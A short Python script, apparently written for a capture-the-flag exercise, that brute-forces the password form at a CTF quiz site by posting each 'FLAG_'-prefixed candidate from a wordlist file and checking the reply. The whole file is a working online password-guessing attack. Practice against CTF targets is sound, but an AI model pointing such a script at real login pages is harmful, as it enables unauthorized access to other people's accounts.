#!/usr/bin/env python3.8

import requests
from bs4 import BeautifulSoup
import sys

password_filename = sys.argv[1]
url = "http://ctfq.u1tramarine.blue/q32/auth.php"
passwords = []
payload = {"password": "hoge"}

with open(password_filename) as f:
    passwords = f.readlines()

for password in passwords:
    password = f"FLAG_{password.strip()}"
    payload["password"] = password
    response = requests.post(url, data=payload)
    soup = BeautifulSoup(response.content, "html.parser")
    res = soup.find("div").text.strip()
    if res != "incorrect...":
        print(f"found!!: {password}")
        print("----------------")
        print(f"{res}")
        sys.exit()
    else:
        print(f"failed...: {password}")

print("YOU ARE A LOSER.")
